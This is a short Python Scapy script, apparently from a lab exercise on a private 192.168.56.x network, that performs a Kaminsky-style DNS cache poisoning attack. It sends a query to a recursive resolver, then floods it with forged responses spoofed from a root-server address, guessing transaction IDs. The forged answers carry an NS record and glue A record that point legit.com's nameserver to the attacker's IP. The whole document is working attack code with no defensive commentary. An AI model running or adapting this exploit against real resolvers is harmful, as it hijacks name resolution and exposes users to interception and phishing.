from scapy.all import *
import random
import threading
import time

#glob vars
packets = 0x0030

#addresses
auth = "192.168.56.101"
attacker = "192.168.56.102"
rec = "192.168.56.103"
root = "192.168.56.104"

#create request packet for attacker.com
dns_req = Ether()/IP(dst=rec, src = attacker)
dns_req = dns_req/UDP(dport = 53)
dns_req = dns_req/DNS(id = 5, aa=0L, z=0L, qdcount=1, ancount=0, qd=(DNSQR(qname='www.legit.com',qtype='A',qclass='IN')))

sendp(dns_req, iface="enp0s3")

testin = raw_input('enter hex:')
testin = int(('0x' + testin), 16)
qdspoof = (DNSQR(qname='legit.com',qtype='A',qclass='IN'))

#create kaminsky packet and array for packets
idbase = testin - 20
kaminsky_arr = []
for x in xrange(packets):
	kaminsky = Ether()/IP(dst=rec, src = root)
	kaminsky = kaminsky/UDP(dport = 1053)
	kaminsky = kaminsky/DNS(id = (idbase + x) % 65536, aa = 0, rd = 0, ra= 0, qd = qdspoof, qr = 1, qdcount =1, nscount=1, arcount=2, cd =1,
							ns = (DNSRR (rrname = 'legit.com.', type= 'NS', rclass = 'IN', rdata = 'ns.legit.com.')), 
					   		ar = (DNSRR(rrname = 'ns.legit.com.', type = 'A', rclass='IN',rdata=attacker)/DNSRROPT(rdlen = 0, rrname='.', type = 'OPT', rclass=4096, z='D0')))	
	kaminsky_arr.append(kaminsky)

#send all packets
sendp(kaminsky_arr, iface="enp0s3", verbose = 0)